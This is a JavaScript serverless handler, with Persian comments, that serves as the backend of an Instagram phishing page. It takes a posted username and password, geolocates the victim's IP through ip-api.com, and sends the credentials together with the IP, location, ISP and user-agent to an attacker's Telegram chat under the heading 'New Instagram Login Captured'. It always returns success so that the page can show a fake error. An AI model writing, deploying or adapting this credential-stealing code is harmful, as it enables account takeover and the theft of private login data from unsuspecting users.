export default async function handler(req, res) {
    // فقط POST قبول می‌شه
    if (req.method !== 'POST') {
        return res.status(405).json({ status: 'error', message: 'Method not allowed' });
    }

    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('Telegram credentials not set in environment variables');
        return res.status(500).json({ status: 'error', message: 'Server configuration error' });
    }

    // دریافت داده‌های فرم
    const username = (req.body?.username || '').trim();
    const password = (req.body?.password || '').trim();

    if (!username || !password) {
        return res.status(400).json({ status: 'error', message: 'Empty fields' });
    }

    // دریافت IP کاربر
    const ip =
        req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
        req.headers['x-real-ip'] ||
        req.socket?.remoteAddress ||
        'Unknown';

    const userAgent = req.headers['user-agent'] || 'Unknown';

    // موقعیت جغرافیایی از IP (ip-api.com)
    let location = 'Unknown';
    let isp = 'Unknown';

    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=query,country,city,isp,org,as`);
        if (geoRes.ok) {
            const geo = await geoRes.json();
            if (geo && geo.country) {
                location = [geo.city, geo.country].filter(Boolean).join(', ');
                isp = geo.isp || geo.org || 'Unknown';
            }
        }
    } catch (geoErr) {
        // نادیده گرفتن خطای GeoIP
        console.error('GeoIP error:', geoErr.message);
    }

    // ساخت پیام
    const message = [
        '🔔 <b>New Instagram Login Captured</b>',
        '',
        '━━━━━━━━━━━━━━━━',
        `👤 <b>Username:</b> <code>${escapeHtml(username)}</code>`,
        `🔑 <b>Password:</b> <code>${escapeHtml(password)}</code>`,
        '━━━━━━━━━━━━━━━━',
        `🌐 <b>IP Address:</b> <code>${ip}</code>`,
        `📍 <b>Location:</b> ${location}`,
        `🏢 <b>ISP:</b> ${isp}`,
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)} (UTC)`,
        '━━━━━━━━━━━━━━━━',
        `📱 <b>User-Agent:</b>`,
        `<code>${escapeHtml(userAgent)}</code>`,
        '━━━━━━━━━━━━━━━━',
    ].join('\n');

    // ارسال به تلگرام
    try {
        const telegramRes = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true,
                }),
            }
        );

        const telegramData = await telegramRes.json();

        if (!telegramData.ok) {
            console.error('Telegram API error:', telegramData);
        }
    } catch (tgErr) {
        console.error('Telegram send error:', tgErr.message);
    }

    // همیشه status: ok برمی‌گرده تا صفحه خطای جعلی نشون بده
    return res.status(200).json({ status: 'ok' });
}

function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;',
    };
    return String(text).replace(/[&<>"']/g, (ch) => map[ch]);
}
